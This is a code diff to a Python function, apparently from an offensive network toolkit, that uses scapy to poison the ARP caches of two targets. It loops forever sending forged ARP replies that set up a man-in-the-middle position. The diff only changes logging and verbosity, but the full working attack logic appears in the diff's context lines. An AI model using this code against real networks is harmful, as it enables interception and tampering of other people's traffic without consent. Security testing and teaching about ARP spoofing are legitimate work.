@@ -12,13 +12,10 @@ from scapy.all import ARP, Ether, conf, getmacbyip, sendp
 def cmd_arpoison(t1, t2, verbose):
     """ARP cache poison"""
 
-    conf.verb = verbose
+    conf.verb = False
 
     mac1 = getmacbyip(t1)
     mac2 = getmacbyip(t2)
-
-    print(mac1)
-    print(mac2)
 
     pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=t2, pdst=t1, hwdst=mac1)
     pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=t1, pdst=t2, hwdst=mac2)
@@ -27,9 +24,16 @@ def cmd_arpoison(t1, t2, verbose):
         while 1:
             sendp(pkt1)
             sendp(pkt2)
-            pkt1.show2()
-            pkt2.show2()
+
+            if verbose:
+                pkt1.show2()
+                pkt2.show2()
+            else:
+                print(pkt1.summary())
+                print(pkt2.summary())
+
             time.sleep(1)
+
     except KeyboardInterrupt:
         pass
 
